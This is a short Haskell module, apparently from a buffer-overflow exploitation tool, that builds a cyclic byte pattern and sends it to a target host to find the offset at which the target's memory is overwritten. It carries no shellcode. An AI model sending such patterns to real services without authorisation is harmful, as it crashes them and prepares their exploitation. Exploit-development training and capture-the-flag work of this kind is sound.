module Overflow.Pattern
( sendPattern
) where

import Overflow
import Data.Text   (Text)
import Data.Char   (chr)
import Text.Printf

-- |...
sendPattern :: Host -> Int -> (Maybe Text, Maybe Text) -> IO ()
sendPattern h l a = do 
        printf "    ───> Sending %d-byte cyclic pattern to target...\n" l
        sendPayload h payload >>= out
    where
        payload   = createPayload (cyclicPattern l) a
        out  True = putStrLn "Done! Finished sending pattern to target."
        out False = putStrLn "Error: An error occurred sending payload to target."

-- ...
cyclicPattern :: Int -> String
cyclicPattern i = take i $ generate
    where
        generate         = concat $ map squash $ iterate nextCycle (65, 97, 48)
        squash (x, y, z) = [chr x, chr y, chr z] 

-- ...
nextCycle :: (Int, Int, Int) -> (Int, Int, Int)
nextCycle (x, y, z) = next (x, y, z + 1)
    where
        next  (a, b, 58) = next (a, b + 1, 48)
        next (a, 123, c) = next (a + 1, 97, c)
        next  (91, _, _) = next (65, 97, 48)
        next   (a, b, c) = (a, b, c)
